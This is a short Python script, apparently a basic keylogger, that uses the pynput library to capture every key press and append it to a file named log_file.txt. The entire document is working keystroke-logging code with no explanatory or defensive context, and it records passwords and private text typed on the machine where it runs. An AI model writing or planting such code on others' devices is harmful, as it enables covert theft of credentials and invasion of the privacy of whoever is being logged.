from pynput.keyboard import Listener


def write_logfile(key):
    key_data = str(key)
    key_data = key_data.replace("'", "")
    with open('log_file.txt', 'a') as file:
        file.write(key_data)


with Listener(on_press=write_logfile) as log:
    log.join()
